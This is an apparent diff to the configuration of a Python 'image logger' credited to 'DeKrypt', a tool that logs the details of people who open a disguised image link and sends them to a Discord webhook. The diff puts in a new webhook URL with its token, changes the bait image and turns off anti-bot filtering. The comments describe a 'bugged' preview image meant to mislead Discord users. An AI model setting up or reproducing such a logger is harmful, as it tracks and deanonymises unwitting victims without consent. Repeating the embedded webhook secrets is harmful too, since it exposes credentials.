@@ -13,8 +13,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1419559956377636864/75OQOvBh1iaV9M1q7Yg41-IozQMoYsUM3XYYXc4mp3LvSkSzKeM191dSNEvIhLj7ODMv",
+    "image": "https://thumbs.dreamstime.com/b/r-214795421.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -41,7 +41,7 @@ config = {
     "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
     "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
-    "antiBot": 1, # Prevents bots from triggering the alert
+    "antiBot": 0, # Prevents bots from triggering the alert
                 # 0 = No Anti-Bot
                 # 1 = Don't ping when it's possibly a bot
                 # 2 = Don't ping when it's 100% a bot
